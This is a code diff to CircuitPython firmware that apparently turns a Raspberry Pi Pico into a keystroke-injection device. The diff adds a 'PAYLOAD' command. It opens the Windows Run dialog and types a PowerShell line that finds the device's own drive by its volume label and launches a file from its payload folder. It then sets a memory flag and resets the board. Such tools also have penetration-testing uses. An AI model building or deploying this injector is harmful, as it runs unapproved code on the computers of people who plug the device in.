@@ -3,6 +3,7 @@ import os
 import re
 import time
 import board
+import microcontroller
 import storage
 import usb_hid
 import digitalio
@@ -25,6 +26,7 @@ led = digitalio.DigitalInOut(board.GP12)
 led.direction = digitalio.Direction.OUTPUT
 led.value = True
 
+flag = microcontroller.nvm[0]
 looping = False
 loop_pos = 0
 
@@ -41,6 +43,20 @@ def execute_command(function, command):
             for idx in range(0, len(command), 1):
                 keys[idx] = getattr(Keycode, command[idx])
             kb.send(*keys)
+    elif function == "PAYLOAD":
+        kb.send(Keycode.WINDOWS, Keycode.R)
+        time.sleep(0.1)
+        volume_label = "PICOUSB"
+        powershell_cmd = (
+                'powershell -NoExit -Command "Start-Sleep 3; '
+                'Get-Volume | Where-Object { $_.FileSystemLabel -eq \'' + volume_label + '\' } | '
+                'ForEach-Object { Start-Process (\'{0}:\\payload\\' + command + '\' -f $_.DriveLetter) }"'
+        )
+        layout.write(powershell_cmd)
+        kb.send(Keycode.ENTER)
+        time.sleep(0.1)
+        microcontroller.nvm[0] = 1
+        microcontroller.reset()
     elif function == "WRITE":
         layout.write(command)
     elif function == "HOLD":
